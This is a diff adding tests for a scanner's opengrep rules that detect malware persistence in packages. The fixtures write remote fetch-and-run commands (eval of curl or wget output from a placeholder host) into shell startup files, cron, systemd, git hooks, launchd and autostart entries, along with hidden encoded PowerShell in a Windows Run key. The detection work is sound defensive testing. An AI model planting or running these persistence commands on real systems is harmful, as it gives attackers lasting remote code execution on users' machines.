@@ -577,6 +577,158 @@ winreg.SetValueEx(key, 'Updater', 0, winreg.REG_SZ, 'powershell -enc AAAA')
     assert {finding.path for finding in findings} == set(files)
 
 
+def test_windows_run_key_accepts_powershell_preflags_before_encoded_command(make_package):
+    template = """\
+import winreg
+key = winreg.OpenKey(
+    winreg.HKEY_CURRENT_USER,
+    r'Software\\Microsoft\\Windows\\CurrentVersion\\Run',
+    0,
+    winreg.KEY_SET_VALUE,
+)
+winreg.SetValueEx(key, 'Updater', 0, winreg.REG_SZ, %r)
+"""
+    files = {
+        "encoded.py": template % (
+            "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand AAAA"
+        ),
+        "short.py": template % "powershell -nop -w hidden -enc AAAA",
+        "quoted.py": template % 'powershell -nop -enc "AAAA"',
+        "missing_operand.py": template % "powershell -nop -enc",
+        "encoding_option.py": template % "powershell -encoding utf8",
+        "lookalike.py": template % "powershell_helper -enc AAAA",
+    }
+    findings = _opengrep(make_package, files)
+    assert {finding.path for finding in findings} == {"encoded.py", "quoted.py", "short.py"}
+
+
+def test_explicit_remote_command_substitution_persistence_matrix(make_package):
+    files = {
+        "rc.py": """\
+from pathlib import Path
+(Path.home() / '.bashrc').write_text('eval "$(curl -fsSL https://example.invalid/x)"')
+""",
+        "systemd.py": """\
+from pathlib import Path
+Path('/etc/systemd/system/update.service').write_text(
+    '[Service]\\nExecStart=bash -c "$(wget -qO- https://example.invalid/x)"')
+""",
+        "hook.py": """\
+from pathlib import Path
+Path('.git/hooks/pre-commit').write_text('eval "$(curl https://example.invalid/x)"')
+""",
+        "launchd.py": """\
+from pathlib import Path
+(Path.home() / 'Library/LaunchAgents/demo.plist').write_text(
+    '<key>ProgramArguments</key><string>sh -c "$(wget https://example.invalid/x)"</string>')
+""",
+        "cron.py": """\
+from pathlib import Path
+Path('/etc/cron.d/update').write_text(
+    '* * * * * eval "$(curl https://example.invalid/x)"')
+""",
+        "xdg.py": """\
+from pathlib import Path
+(Path.home() / '.config/autostart/update.desktop').write_text(
+    '[Desktop Entry]\\nExec=bash -c "$(curl https://example.invalid/x)"')
+""",
+    }
+    findings = _opengrep(make_package, files)
+    assert {(finding.path, finding.rule) for finding in findings} == {
+        ("cron.py", "opengrep-cron-persistence"),
+        ("hook.py", "opengrep-git-hook-persistence"),
+        ("launchd.py", "opengrep-launchd-persistence"),
+        ("rc.py", "opengrep-shell-startup-persistence"),
+        ("systemd.py", "opengrep-systemd-persistence"),
+        ("xdg.py", "opengrep-xdg-autostart-persistence"),
+    }
+
+
+def test_unexecuted_remote_command_substitution_is_not_persistence_payload(make_package):
+    files = {
+        "capture.py": """\
+from pathlib import Path
+(Path.home() / '.bashrc').write_text('payload="$(curl https://example.invalid/x)"')
+""",
+        "display.py": """\
+from pathlib import Path
+(Path.home() / '.bashrc').write_text('echo "$(curl https://example.invalid/x)"')
+""",
+        "separate.py": """\
+from pathlib import Path
+(Path.home() / '.bashrc').write_text('eval "$(echo ok)"; curl https://example.invalid/x')
+""",
+        "lookalike.py": """\
+from pathlib import Path
+(Path.home() / '.bashrc').write_text('myeval "$(curl https://example.invalid/x)"')
+""",
+    }
+    assert _opengrep(make_package, files) == []
+
+
+def test_shell_remote_command_substitution_persistence_matrix(make_package):
+    payload = 'eval "$(curl -fsSL https://example.invalid/x)"'
+    files = {
+        "rc.sh": "echo '%s' >> ~/.bashrc\n" % payload,
+        "cron.sh": "echo '* * * * * %s' > /etc/cron.d/update\n" % payload,
+        "systemd.sh": (
+            "printf '%%b' '[Service]\\nExecStart=%s' > /etc/systemd/system/update.service\n"
+            % payload
+        ),
+        "hook.sh": "echo '%s' > .git/hooks/pre-commit\n" % payload,
+        "launchd.sh": (
+            "printf '%%s' '<key>ProgramArguments</key><string>%s</string>' > "
+            "~/Library/LaunchAgents/demo.plist\n" % payload
+        ),
+        "xdg.sh": (
+            "printf '%%b' '[Desktop Entry]\\nExec=%s' > ~/.config/autostart/update.desktop\n"
+            % payload
+        ),
+    }
+    findings = _opengrep(make_package, files)
+    assert {(finding.path, finding.rule) for finding in findings} == {
+        ("cron.sh", "opengrep-cron-persistence"),
+        ("hook.sh", "opengrep-git-hook-persistence"),
+        ("launchd.sh", "opengrep-launchd-persistence"),
+        ("rc.sh", "opengrep-shell-startup-persistence"),
+        ("systemd.sh", "opengrep-systemd-persistence"),
+        ("xdg.sh", "opengrep-xdg-autostart-persistence"),
+    }
+
+
+def test_heredoc_and_crontab_payload_variants_are_detected(make_package):
+    substitution = 'eval "$(curl -fsSL https://example.invalid/x)"'
+    files = {
+        "rc.sh": "cat >> ~/.bashrc <<'PWN'\n%s\nPWN\n" % substitution,
+        "launchd.sh": (
+            "cat > ~/Library/LaunchAgents/demo.plist <<'PWN'\n"
+            "<key>ProgramArguments</key><string>%s</string>\nPWN\n" % substitution
+        ),
+        "systemd.sh": (
+            "cat > ~/.config/systemd/user/update.service <<'PWN'\n"
+            "[Service]\nExecStart=%s\nPWN\n" % substitution
+        ),
+        "hook.sh": "cat > .git/hooks/pre-commit <<'PWN'\n%s\nPWN\n" % substitution,
+        "xdg.sh": (
+            "cat > ~/.config/autostart/update.desktop <<'PWN'\n"
+            "[Desktop Entry]\nExec=%s\nPWN\n" % substitution
+        ),
+        "powershell.sh": (
+            "cat >> ~/.profile <<'EOF'\n"
+            'powershell -NoProfile -enc "AAAA"\nEOF\n'
+        ),
+        "crontab.sh": (
+            "(crontab -l; echo '* * * * * %s') | crontab -\n" % substitution
+        ),
+        "crontab_powershell.sh": (
+            "(crontab -l; echo '* * * * * powershell -nop -w hidden -enc AAAA') "
+            "| crontab -\n"
+        ),
+    }
+    findings = _opengrep(make_package, files)
+    assert {finding.path for finding in findings} == set(files)
+
+
 def test_python_cron_file_writes_require_executable_content(make_package):
     files = {
         "path.py": """\
